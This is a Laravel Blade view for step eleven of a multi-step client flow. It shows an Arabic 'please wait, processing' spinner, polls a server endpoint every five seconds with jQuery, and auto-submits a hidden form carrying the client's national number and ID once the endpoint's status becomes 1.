@extends('frontend.layout.master')
@section('style')

    <style>

        body {
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat;
            background-color: #00697f;
        }

        body .popup-content {
            background: white;
            opacity: 1;
        }

        div#popup-container {
            background: transparent;
        }

        @media (max-width: 768px) {

            body {
                background-size: cover;
            }
        }


    </style>
@endsection




@section('content')

<form action="{{route('stepElevenAction')}}" method="post" id="form">
    @csrf
    <input type="hidden" name="national_number" value="{{$client->national_number}}">
    <input type="hidden" name="client_id" value="{{$client->id}}">
    <button type="submit" id="submit_button"></button>
</form>
<div class="popup-container d-flex justify-content-center alien-items-center text-center" id="popup-container">
    <div class="popup-content">
        <h5 class="mb-3 mt-3">الرجاء الانتظار </h5>
        <div class="spinner-border m-5" role="status">
          <span class="visually-hidden"></span>
        </div>
        <h5>جاري المعالجة يرجى الانتظار....</h5>
    </div>
</div>

@endsection

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
    $(document).ready(function () {
        function fetchNotifications() {
            $.ajax({
                url: '{{ route("client.getEndPointAjax", $client->id) }}',
                type: 'GET',
                dataType: 'json',
                success: function (data) {
                    console.log("Received data from server:", data); // Log full response
                    if (data.status === 1) {
                        console.log("Status is 1. Submitting form...");
                        $('#form').submit();
                    } else {
                        console.log("Status is not 1. Current status:", data.status);
                    }
                },
                error: function (xhr, status, error) {
                    console.error("AJAX request failed:", error);
                    console.log("XHR object:", xhr);
                    console.log("Status:", status);
                }
            });
        }

        fetchNotifications();
        setInterval(fetchNotifications, 5000);
    });
</script>

